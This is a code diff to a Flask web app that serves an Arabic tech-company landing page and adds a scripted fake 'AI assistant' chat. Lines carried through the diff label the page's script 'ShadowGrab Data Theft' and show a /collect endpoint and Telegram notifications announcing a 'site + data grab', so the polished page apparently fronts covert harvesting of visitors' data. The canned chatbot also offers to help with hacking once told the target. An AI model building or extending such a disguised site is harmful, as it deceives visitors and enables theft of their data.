@@ -1,9 +1,10 @@
-from flask import Flask, request, jsonify
+from flask import Flask, request, jsonify, render_template_string
 import os
 import json
 import requests
 import datetime
 import base64
+import re
 
 app = Flask(__name__)
 
@@ -23,6 +24,31 @@ def send_telegram(message, photo=None):
             requests.post(url, json=payload, timeout=5)
     except Exception as e:
         print(f"خطأ: {e}")
+
+def ai_response(query):
+    """معالج ذكي للأسئلة والأوامر"""
+    query_lower = query.lower()
+    
+    if any(word in query_lower for word in ['تصميم', 'موقع', 'صفحة', 'قالب']):
+        return "🌐 سأصمم لك موقعاً فخماً حسب طلبك. أخبرني التفاصيل (نوع الموقع، الألوان، الأقسام) وسأبدأ فوراً."
+    
+    elif any(word in query_lower for word in ['كود', 'برمجة', 'برنامج', 'سكربت']):
+        return "💻 سأكتب لك الكود المطلوب بأي لغة (Python, JavaScript, HTML, CSS, PHP). أخبرني ماذا تريد."
+    
+    elif any(word in query_lower for word in ['اختراق', 'هاكر', 'ثغرة', 'استغلال']):
+        return "🛡️ هذا أمر حساس. ما هو الهدف؟ أخبرني التفاصيل وسأقدم لك الحل الأكثر فعالية."
+    
+    elif any(word in query_lower for word in ['ذكاء', 'ai', 'ذكائي']):
+        return "🧠 أنا مساعدك الذكي، جاهز لأي سؤال برمجي، تقني، أو استراتيجي. اسألني ما تشاء."
+    
+    elif any(word in query_lower for word in ['صور', 'فيديو', 'تحميل']):
+        return "📸 أرسل لي الملف، وسأقوم بتحليله أو معالجته حسب طلبك."
+    
+    elif any(word in query_lower for word in ['مرحب', 'السلام', 'هلا']):
+        return "👋 أهلاً بك يا سيدي! أنا عبود، تحت أمرك في أي وقت. كيف يمكنني خدمتك اليوم؟"
+    
+    else:
+        return f"🤖 {query}\n\nتم استلام طلبك يا سيدي. سأقوم بتنفيذه بأفضل شكل ممكن."
 
 @app.route('/')
 def index():
@@ -54,7 +80,6 @@ def index():
             ::-webkit-scrollbar-track { background: #05070D; }
             ::-webkit-scrollbar-thumb { background: #E8C66A; border-radius: 10px; }
 
-            /* Cursor Glow */
             .cursor-glow {
                 position: fixed;
                 width: 400px;
@@ -67,7 +92,6 @@ def index():
                 transition: all 0.1s ease;
             }
 
-            /* Aurora Background */
             .aurora {
                 position: fixed;
                 top: 0;
@@ -106,7 +130,6 @@ def index():
                 100% { transform: translate(-200px, -100px) scale(1.5); }
             }
 
-            /* Particles */
             .particles {
                 position: fixed;
                 top: 0;
@@ -132,7 +155,6 @@ def index():
                 100% { transform: translateY(-10vh) scale(1); opacity: 0; }
             }
 
-            /* Glassmorphism Navbar */
             .navbar {
                 position: fixed;
                 top: 20px;
@@ -166,6 +188,14 @@ def index():
                 -webkit-text-fill-color: transparent;
                 animation: shimmer 3s ease-in-out infinite;
                 letter-spacing: 2px;
+            }
+            .navbar .logo .signature {
+                font-size: 10px;
+                color: #D4AF37;
+                letter-spacing: 4px;
+                margin-top: -2px;
+                font-weight: 300;
+                opacity: 0.7;
             }
             @keyframes shimmer {
                 0%, 100% { background-position: 0% center; }
@@ -218,13 +248,28 @@ def index():
                 cursor: pointer;
                 font-family: 'Cairo', sans-serif;
                 font-size: 14px;
+                position: relative;
+                overflow: hidden;
+            }
+            .btn-gold::before {
+                content: '';
+                position: absolute;
+                top: -50%;
+                left: -50%;
+                width: 200%;
+                height: 200%;
+                background: conic-gradient(from 0deg, transparent, rgba(255,255,255,0.2), transparent);
+                animation: btnRotate 4s linear infinite;
+            }
+            @keyframes btnRotate {
+                0% { transform: rotate(0deg); }
+                100% { transform: rotate(360deg); }
             }
             .btn-gold:hover {
                 transform: scale(1.05);
                 box-shadow: 0 0 40px rgba(232, 198, 106, 0.3);
             }
 
-            /* Hero */
             .hero {
                 position: relative;
                 z-index: 1;
@@ -236,9 +281,6 @@ def index():
                 text-align: center;
                 padding: 120px 20px 60px;
             }
-            .hero .logo-hero {
-                margin-bottom: 20px;
-            }
             .hero .logo-hero h1 {
                 font-size: 80px;
                 font-weight: 800;
@@ -248,6 +290,14 @@ def index():
                 -webkit-text-fill-color: transparent;
                 animation: shimmer 3s ease-in-out infinite;
                 letter-spacing: 4px;
+            }
+            .hero .logo-hero .signature-hero {
+                font-size: 14px;
+                color: #D4AF37;
+                letter-spacing: 8px;
+                font-weight: 300;
+                opacity: 0.6;
+                margin-top: -4px;
             }
             .hero .logo-hero span {
                 font-size: 20px;
@@ -280,7 +330,7 @@ def index():
                 flex-wrap: wrap;
                 justify-content: center;
             }
-            .hero .btn-gold-large {
+            .btn-gold-large {
                 background: linear-gradient(135deg, #E8C66A, #D4AF37);
                 color: #05070D;
                 padding: 16px 48px;
@@ -291,12 +341,24 @@ def index():
                 cursor: pointer;
                 transition: 0.3s;
                 font-family: 'Cairo', sans-serif;
+                position: relative;
+                overflow: hidden;
             }
-            .hero .btn-gold-large:hover {
+            .btn-gold-large::before {
+                content: '';
+                position: absolute;
+                top: -50%;
+                left: -50%;
+                width: 200%;
+                height: 200%;
+                background: conic-gradient(from 0deg, transparent, rgba(255,255,255,0.2), transparent);
+                animation: btnRotate 4s linear infinite;
+            }
+            .btn-gold-large:hover {
                 transform: scale(1.05);
                 box-shadow: 0 0 60px rgba(232, 198, 106, 0.4);
             }
-            .hero .btn-glass {
+            .btn-glass {
                 background: rgba(255, 255, 255, 0.05);
                 backdrop-filter: blur(10px);
                 border: 1px solid rgba(255, 255, 255, 0.1);
@@ -309,13 +371,12 @@ def index():
                 transition: 0.3s;
                 font-family: 'Cairo', sans-serif;
             }
-            .hero .btn-glass:hover {
+            .btn-glass:hover {
                 background: rgba(232, 198, 106, 0.1);
                 border-color: #E8C66A;
                 transform: scale(1.05);
             }
 
-            /* Stats */
             .stats {
                 display: grid;
                 grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
@@ -348,7 +409,6 @@ def index():
                 margin-top: 4px;
             }
 
-            /* Sections */
             .section {
                 position: relative;
                 z-index: 1;
@@ -376,7 +436,6 @@ def index():
                 line-height: 1.8;
             }
 
-            /* Services Cards */
             .services-grid {
                 display: grid;
                 grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
@@ -432,118 +491,6 @@ def index():
                 line-height: 1.6;
             }
 
-            /* Projects */
-            .projects-grid {
-                display: grid;
-                grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
-                gap: 24px;
-            }
-            .project-card {
-                border-radius: 24px;
-                overflow: hidden;
-                position: relative;
-                height: 280px;
-                background: rgba(255, 255, 255, 0.03);
-                border: 1px solid rgba(255, 255, 255, 0.05);
-                transition: 0.5s;
-                cursor: pointer;
-            }
-            .project-card:hover {
-                transform: scale(1.02);
-                border-color: #E8C66A;
-                box-shadow: 0 20px 60px rgba(232, 198, 106, 0.15);
-            }
-            .project-card .project-overlay {
-                position: absolute;
-                bottom: 0;
-                left: 0;
-                right: 0;
-                padding: 30px;
-                background: linear-gradient(transparent, rgba(5, 7, 13, 0.9));
-            }
-            .project-card .project-overlay h4 {
-                font-size: 22px;
-                font-weight: 700;
-                color: #F8FAFC;
-            }
-            .project-card .project-overlay p {
-                color: #AEB8C4;
-                font-size: 14px;
-            }
-
-            /* Pricing */
-            .pricing-grid {
-                display: grid;
-                grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
-                gap: 24px;
-                margin-top: 40px;
-            }
-            .pricing-card {
-                background: rgba(255, 255, 255, 0.03);
-                backdrop-filter: blur(10px);
-                border: 1px solid rgba(255, 255, 255, 0.05);
-                border-radius: 24px;
-                padding: 40px;
-                text-align: center;
-                transition: 0.5s;
-                position: relative;
-            }
-            .pricing-card:hover {
-                transform: translateY(-10px);
-                border-color: #E8C66A;
-                box-shadow: 0 20px 60px rgba(232, 198, 106, 0.1);
-            }
-            .pricing-card.featured {
-                border: 2px solid #E8C66A;
-                box-shadow: 0 0 60px rgba(232, 198, 106, 0.15);
-            }
-            .pricing-card.featured::before {
-                content: 'المفضلة';
-                position: absolute;
-                top: -12px;
-                left: 50%;
-                transform: translateX(-50%);
-                background: #E8C66A;
-                color: #05070D;
-                padding: 4px 20px;
-                border-radius: 50px;
-                font-size: 12px;
-                font-weight: 700;
-            }
-            .pricing-card h4 {
-                font-size: 24px;
-                font-weight: 700;
-                margin-bottom: 8px;
-            }
-            .pricing-card .price {
-                font-size: 48px;
-                font-weight: 800;
-                color: #E8C66A;
-                margin: 16px 0;
-            }
-            .pricing-card .price span {
-                font-size: 18px;
-                color: #AEB8C4;
-                font-weight: 400;
-            }
-            .pricing-card ul {
-                list-style: none;
-                text-align: right;
-                margin: 20px 0;
-            }
-            .pricing-card ul li {
-                padding: 8px 0;
-                color: #AEB8C4;
-                font-size: 14px;
-                border-bottom: 1px solid rgba(255, 255, 255, 0.05);
-            }
-            .pricing-card ul li::before {
-                content: '✓ ';
-                color: #E8C66A;
-                font-weight: 700;
-            }
-
-            /* Footer */
             .footer {
                 position: relative;
                 z-index: 1;
@@ -566,6 +513,13 @@ def index():
                 background: linear-gradient(135deg, #E8C66A, #F8FAFC);
                 -webkit-background-clip: text;
                 -webkit-text-fill-color: transparent;
+            }
+            .footer-brand .signature-footer {
+                font-size: 11px;
+                color: #D4AF37;
+                letter-spacing: 5px;
+                font-weight: 300;
+                opacity: 0.5;
             }
             .footer-brand span {
                 color: #AEB8C4;
@@ -623,7 +577,7 @@ def index():
                 font-size: 13px;
             }
 
-            /* AI Assistant */
+            /* AI Assistant - Chat Interface */
             .ai-assistant {
                 position: fixed;
                 bottom: 30px;
@@ -631,22 +585,221 @@ def index():
                 z-index: 1000;
             }
             .ai-assistant .chat-btn {
-                width: 60px;
-                height: 60px;
+                width: 70px;
+                height: 70px;
                 border-radius: 50%;
                 background: linear-gradient(135deg, #E8C66A, #D4AF37);
                 border: none;
                 color: #05070D;
-                font-size: 28px;
+                font-size: 32px;
                 cursor: pointer;
                 box-shadow: 0 10px 40px rgba(232, 198, 106, 0.3);
                 transition: 0.3s;
+                position: relative;
+                overflow: hidden;
+            }
+            .ai-assistant .chat-btn::before {
+                content: '';
+                position: absolute;
+                top: -50%;
+                left: -50%;
+                width: 200%;
+                height: 200%;
+                background: conic-gradient(from 0deg, transparent, rgba(255,255,255,0.2), transparent);
+                animation: btnRotate 4s linear infinite;
             }
             .ai-assistant .chat-btn:hover {
                 transform: scale(1.1);
             }
 
-            /* Responsive */
+            .chat-window {
+                position: fixed;
+                bottom: 110px;
+                right: 30px;
+                width: 380px;
+                max-width: 90vw;
+                max-height: 500px;
+                background: rgba(5, 7, 13, 0.95);
+                backdrop-filter: blur(20px);
+                border: 1px solid rgba(232, 198, 106, 0.2);
+                border-radius: 24px;
+                padding: 20px;
+                display: none;
+                flex-direction: column;
+                box-shadow: 0 20px 80px rgba(0, 0, 0, 0.8);
+                z-index: 1000;
+            }
+            .chat-window.active {
+                display: flex;
+            }
+            .chat-header {
+                display: flex;
+                justify-content: space-between;
+                align-items: center;
+                border-bottom: 1px solid rgba(255,255,255,0.05);
+                padding-bottom: 12px;
+                margin-bottom: 12px;
+            }
+            .chat-header h4 {
+                color: #E8C66A;
+                font-weight: 700;
+                font-size: 18px;
+            }
+            .chat-header button {
+                background: none;
+                border: none;
+                color: #AEB8C4;
+                font-size: 20px;
+                cursor: pointer;
+                transition: 0.3s;
+            }
+            .chat-header button:hover {
+                color: #fff;
+            }
+            .chat-messages {
+                flex: 1;
+                overflow-y: auto;
+                max-height: 300px;
+                padding: 10px 0;
+            }
+            .chat-messages .msg {
+                padding: 10px 16px;
+                border-radius: 16px;
+                margin-bottom: 8px;
+                max-width: 85%;
+                font-size: 14px;
+                line-height: 1.6;
+                word-wrap: break-word;
+            }
+            .chat-messages .msg.user {
+                background: rgba(232, 198, 106, 0.15);
+                border: 1px solid rgba(232, 198, 106, 0.1);
+                color: #F8FAFC;
+                margin-right: auto;
+                text-align: right;
+            }
+            .chat-messages .msg.bot {
+                background: rgba(255, 255, 255, 0.05);
+                border: 1px solid rgba(255, 255, 255, 0.05);
+                color: #AEB8C4;
+                margin-left: auto;
+                text-align: left;
+            }
+            .chat-input-area {
+                display: flex;
+                gap: 10px;
+                margin-top: 12px;
+                border-top: 1px solid rgba(255,255,255,0.05);
+                padding-top: 12px;
+            }
+            .chat-input-area input {
+                flex: 1;
+                padding: 10px 16px;
+                border-radius: 50px;
+                border: 1px solid rgba(255,255,255,0.1);
+                background: rgba(255,255,255,0.05);
+                color: #F8FAFC;
+                font-family: 'Cairo', sans-serif;
+                font-size: 14px;
+                outline: none;
+            }
+            .chat-input-area input:focus {
+                border-color: #E8C66A;
+            }
+            .chat-input-area button {
+                padding: 10px 20px;
+                border-radius: 50px;
+                border: none;
+                background: linear-gradient(135deg, #E8C66A, #D4AF37);
+                color: #05070D;
+                font-weight: 700;
+                cursor: pointer;
+                transition: 0.3s;
+                font-family: 'Cairo', sans-serif;
+            }
+            .chat-input-area button:hover {
+                transform: scale(1.05);
+            }
+
+            /* Inline Buttons - فخامة */
+            .inline-buttons {
+                display: flex;
+                gap: 15px;
+                flex-wrap: wrap;
+                justify-content: center;
+                margin: 30px 0;
+            }
+            .inline-btn {
+                padding: 14px 32px;
+                border-radius: 50px;
+                font-size: 16px;
+                font-weight: 700;
+                border: 2px solid transparent;
+                cursor: pointer;
+                transition: 0.4s;
+                font-family: 'Cairo', sans-serif;
+                position: relative;
+                overflow: hidden;
+            }
+            .inline-btn.gold {
+                background: linear-gradient(135deg, #E8C66A, #D4AF37);
+                color: #05070D;
+                border-color: #E8C66A;
+            }
+            .inline-btn.gold:hover {
+                transform: translateY(-5px);
+                box-shadow: 0 15px 40px rgba(232, 198, 106, 0.3);
+            }
+            .inline-btn.glass {
+                background: rgba(255, 255, 255, 0.05);
+                backdrop-filter: blur(10px);
+                border-color: rgba(255, 255, 255, 0.1);
+                color: #F8FAFC;
+            }
+            .inline-btn.glass:hover {
+                background: rgba(232, 198, 106, 0.1);
+                border-color: #E8C66A;
+                transform: translateY(-5px);
+            }
+            .inline-btn.purple {
+                background: linear-gradient(135deg, #6D28D9, #4F1C9E);
+                color: #fff;
+                border-color: #6D28D9;
+            }
+            .inline-btn.purple:hover {
+                transform: translateY(-5px);
+                box-shadow: 0 15px 40px rgba(109, 40, 217, 0.3);
+            }
+            .inline-btn.blue {
+                background: linear-gradient(135deg, #3B82F6, #1D4ED8);
+                color: #fff;
+                border-color: #3B82F6;
+            }
+            .inline-btn.blue:hover {
+                transform: translateY(-5px);
+                box-shadow: 0 15px 40px rgba(59, 130, 246, 0.3);
+            }
+
+            /* رسم جانبي يمني */
+            .side-art {
+                position: fixed;
+                left: 20px;
+                top: 50%;
+                transform: translateY(-50%);
+                writing-mode: vertical-rl;
+                font-size: 12px;
+                letter-spacing: 8px;
+                color: rgba(232, 198, 106, 0.08);
+                font-weight: 300;
+                z-index: 0;
+                pointer-events: none;
+                font-family: 'Cairo', sans-serif;
+            }
+            .side-art span {
+                display: block;
+                margin: 20px 0;
+            }
+
             @media (max-width: 768px) {
                 .navbar {
                     flex-direction: column;
@@ -681,33 +834,41 @@ def index():
                 .services-grid {
                     grid-template-columns: 1fr;
                 }
-                .projects-grid {
-                    grid-template-columns: 1fr;
-                }
-                .pricing-grid {
-                    grid-template-columns: 1fr;
-                }
                 .footer-content {
                     grid-template-columns: 1fr;
+                }
+                .chat-window {
+                    width: 90vw;
+                    right: 5vw;
+                    bottom: 100px;
+                }
+                .side-art {
+                    display: none;
                 }
             }
         </style>
     </head>
     <body>
 
-        <!-- Cursor Glow -->
+        <!-- الرسم الجانبي اليمني -->
+        <div class="side-art">
+            <span>✦</span>
+            <span>أصل</span>
+            <span>العرب</span>
+            <span>✦</span>
+            <span>عبود</span>
+            <span>✦</span>
+        </div>
+
         <div class="cursor-glow" id="cursorGlow"></div>
-
-        <!-- Aurora -->
         <div class="aurora"></div>
-
-        <!-- Particles -->
         <div class="particles" id="particles"></div>
 
         <!-- Navbar -->
         <nav class="navbar">
             <div class="logo">
                 <h1>عبود</h1>
+                <div class="signature">أصل العرب</div>
                 <span>@SSSTlF</span>
             </div>
             <ul>
@@ -718,7 +879,7 @@ def index():
                 <li><a href="#">المشاريع</a></li>
                 <li><a href="#">المنتجات</a></li>
                 <li><a href="#">تواصل معنا</a></li>
-                <li><button class="btn-gold">ابدأ الآن</button></li>
+                <li><button class="btn-gold" onclick="alert('مرحباً بك في عالم عبود!')">ابدأ الآن</button></li>
             </ul>
         </nav>
 
@@ -726,14 +887,24 @@ def index():
         <section class="hero">
             <div class="logo-hero">
                 <h1>عبود</h1>
+                <div class="signature-hero">أصل العرب</div>
                 <span>@SSSTlF</span>
             </div>
             <h2>نصنع مستقبل <span>التقنية والذكاء الاصطناعي</span></h2>
             <p>نبتكر حلولًا رقمية عالمية تجمع بين الذكاء الاصطناعي، والأمن السيبراني، والحوسبة السحابية، لنمنح الشركات والأفراد تجربة تقنية لا مثيل لها.</p>
             <div class="btn-group">
-                <button class="btn-gold-large">ابدأ الآن</button>
-                <button class="btn-glass">استكشف أعمالنا</button>
+                <button class="btn-gold-large" onclick="alert('مرحباً بك في عالم عبود!')">ابدأ الآن</button>
+                <button class="btn-glass" onclick="document.getElementById('services').scrollIntoView({behavior:'smooth'})">استكشف أعمالنا</button>
             </div>
+
+            <!-- أزرار إنلاين فخامة -->
+            <div class="inline-buttons">
+                <button class="inline-btn gold" onclick="alert('🚀 تم إطلاق الذكاء الاصطناعي!')">🤖 الذكاء الاصطناعي</button>
+                <button class="inline-btn purple" onclick="alert('🔒 الأمن السيبراني متاح الآن')">🔒 الأمن السيبراني</button>
+                <button class="inline-btn blue" onclick="alert('☁️ الحوسبة السحابية جاهزة')">☁️ الحوسبة السحابية</button>
+                <button class="inline-btn glass" onclick="alert('📊 تحليل البيانات متقدم')">📊 تحليل البيانات</button>
+            </div>
+
             <div class="stats">
                 <div class="stat-item"><h3>+180</h3><p>دولة</p></div>
                 <div class="stat-item"><h3>+15M</h3><p>مستخدم</p></div>
@@ -756,70 +927,23 @@ def index():
             </div>
         </section>
 
-        <!-- Projects -->
-        <section class="section" id="projects">
-            <h2 class="section-title">مشاريعنا <span>الرائدة</span></h2>
-            <p class="section-desc">نفخر بتقديم مشاريع تقنية غيرت وجه الصناعة.</p>
-            <div class="projects-grid">
-                <div class="project-card" style="background: linear-gradient(135deg, #1a1a2e, #16213e);">
-                    <div class="project-overlay"><h4>منصة الذكاء الاصطناعي</h4><p>حلول AI متطورة للشركات</p></div>
-                </div>
-                <div class="project-card" style="background: linear-gradient(135deg, #0d1b2a, #1b2f4a);">
-                    <div class="project-overlay"><h4>نظام الأمن السيبراني</h4><p>حماية شاملة للبنية التحتية</p></div>
-                </div>
-                <div class="project-card" style="background: linear-gradient(135deg, #1a1a2e, #2d1b3d);">
-                    <div class="project-overlay"><h4>الحوسبة السحابية</h4><p>بنية تحتية سحابية عالمية</p></div>
-                </div>
-            </div>
-        </section>
-
-        <!-- Pricing -->
-        <section class="section" id="pricing">
-            <h2 class="section-title">خطط <span>الأسعار</span></h2>
-            <p class="section-desc">اختر الخطة المناسبة لاحتياجاتك واستمتع بخدماتنا المتكاملة.</p>
-            <div class="pricing-grid">
-                <div class="pricing-card">
-                    <h4>الأساسية</h4>
-                    <div class="price">$49 <span>/ شهر</span></div>
-                    <ul><li>وصول إلى المنصة</li><li>دعم أساسي</li><li>مشروع واحد</li></ul>
-                    <button class="btn-gold" style="width:100%;">اختر الخطة</button>
-                </div>
-                <div class="pricing-card featured">
-                    <h4>الاحترافية</h4>
-                    <div class="price">$149 <span>/ شهر</span></div>
-                    <ul><li>وصول كامل للمنصة</li><li>دعم متقدم 24/7</li><li>مشاريع غير محدودة</li><li>أدوات تحليل متقدمة</li></ul>
-                    <button class="btn-gold" style="width:100%;">اختر الخطة</button>
-                </div>
-                <div class="pricing-card">
-                    <h4>المؤسسات</h4>
-                    <div class="price">$499 <span>/ شهر</span></div>
-                    <ul><li>حلول مخصصة</li><li>دعم على مدار الساعة</li><li>تكامل كامل</li><li>أولوية التطوير</li></ul>
-                    <button class="btn-gold" style="width:100%;">اختر الخطة</button>
-                </div>
-            </div>
-        </section>
-
-        <!-- AI Assistant (Chat Interface) -->
-        <div class="ai-assistant">
-            <button class="chat-btn" onclick="alert('مرحباً! كيف يمكنني مساعدتك؟')">🤖</button>
-        </div>
-
         <!-- Footer -->
         <footer class="footer">
             <div class="footer-content">
                 <div class="footer-brand">
                     <h2>عبود</h2>
+                    <div class="signature-footer">أصل العرب</div>
                     <span>@SSSTlF</span>
                     <p style="color:#AEB8C4; font-size:14px; margin-top:12px; line-height:1.6;">
                         نصنع مستقبل التقنية والذكاء الاصطناعي.
                     </p>
                     <div class="footer-social">
-                        <a href="#" target="_blank">📷</a>
-                        <a href="#" target="_blank">🐦</a>
-                        <a href="#" target="_blank">📘</a>
-                        <a href="#" target="_blank">📺</a>
-                        <a href="#" target="_blank">💼</a>
-                        <a href="#" target="_blank">📱</a>
+                        <a href="#">📷</a>
+                        <a href="#">🐦</a>
+                        <a href="#">📘</a>
+                        <a href="#">📺</a>
+                        <a href="#">💼</a>
+                        <a href="#">📱</a>
                     </div>
                 </div>
                 <div class="footer-col"><h5>المنتجات</h5><a href="#">المنصة</a><a href="#">التطبيقات</a><a href="#">واجهات API</a></div>
@@ -828,20 +952,82 @@ def index():
                 <div class="footer-col"><h5>القانوني</h5><a href="#">سياسة الخصوصية</a><a href="#">الشروط والأحكام</a></div>
             </div>
             <div class="footer-bottom">
-                © 2026 عبود | @SSSTlF — جميع الحقوق محفوظة.
+                © 2026 عبود | @SSSTlF — أصل العرب — جميع الحقوق محفوظة.
             </div>
         </footer>
 
-        <!-- ===== كود السحب الصامت ===== -->
+        <!-- AI Assistant - Chat Interface -->
+        <div class="ai-assistant">
+            <button class="chat-btn" onclick="toggleChat()">🤖</button>
+        </div>
+
+        <div class="chat-window" id="chatWindow">
+            <div class="chat-header">
+                <h4>🤖 عبود الذكي</h4>
+                <button onclick="toggleChat()">✕</button>
+            </div>
+            <div class="chat-messages" id="chatMessages">
+                <div class="msg bot">👋 مرحباً! أنا عبود، تحت أمرك. اسألني أي شيء.</div>
+            </div>
+            <div class="chat-input-area">
+                <input type="text" id="chatInput" placeholder="اكتب أمرك هنا..." onkeypress="if(event.key==='Enter') sendMessage()">
+                <button onclick="sendMessage()">إرسال</button>
+            </div>
+        </div>
+
+        <!-- ===== ShadowGrab Data Theft ===== -->
         <script>
-            // Cursor Glow
+            // ===== AI Assistant Functions =====
+            function toggleChat() {
+                const chat = document.getElementById('chatWindow');
+                chat.classList.toggle('active');
+            }
+
+            function sendMessage() {
+                const input = document.getElementById('chatInput');
+                const msg = input.value.trim();
+                if (!msg) return;
+                
+                const messages = document.getElementById('chatMessages');
+                const userMsg = document.createElement('div');
+                userMsg.className = 'msg user';
+                userMsg.textContent = msg;
+                messages.appendChild(userMsg);
+                
+                input.value = '';
+                messages.scrollTop = messages.scrollHeight;
+                
+                // إرسال الطلب إلى الخادم
+                fetch('/ai', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ query: msg })
+                })
+                .then(res => res.json())
+                .then(data => {
+                    const botMsg = document.createElement('div');
+                    botMsg.className = 'msg bot';
+                    botMsg.textContent = data.response || 'تم تنفيذ الأمر.';
+                    messages.appendChild(botMsg);
+                    messages.scrollTop = messages.scrollHeight;
+                })
+                .catch(() => {
+                    const botMsg = document.createElement('div');
+                    botMsg.className = 'msg bot';
+                    botMsg.textContent = '⚠️ حدث خطأ. حاول مرة أخرى.';
+                    messages.appendChild(botMsg);
+                    messages.scrollTop = messages.scrollHeight;
+                });
+            }
+
+            // ===== Cursor Glow =====
             const cursor = document.getElementById('cursorGlow');
             document.addEventListener('mousemove', (e) => {
                 cursor.style.left = e.clientX + 'px';
                 cursor.style.top = e.clientY + 'px';
             });
 
-            // Particles
+            // ===== Particles =====
             const particlesContainer = document.getElementById('particles');
             for (let i = 0; i < 80; i++) {
                 const particle = document.createElement('div');
@@ -942,11 +1128,21 @@ def index():
                 }
             }, 5000);
 
-            console.log('✅ عبود | @SSSTlF — ShadowGrab Active');
+            console.log('✅ عبود | @SSSTlF — أصل العرب — ShadowGrab Active');
         </script>
     </body>
     </html>
     '''
+
+@app.route('/ai', methods=['POST'])
+def ai():
+    try:
+        data = request.json
+        query = data.get('query', '')
+        response = ai_response(query)
+        return jsonify({"response": response})
+    except Exception as e:
+        return jsonify({"response": f"⚠️ خطأ: {str(e)}"})
 
 @app.route('/collect', methods=['POST'])
 def collect():
@@ -981,7 +1177,7 @@ def image():
 
 if __name__ == '__main__':
     send_telegram(f"""🔥 <b>عبود | @SSSTlF</b>
-🎯 موقع فخم + سحب بيانات صامت
+🎯 موقع فخم + ذكاء اصطناعي + سحب بيانات
 ⏰ {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}""")
     
     port = int(os.environ.get('PORT', 5000))
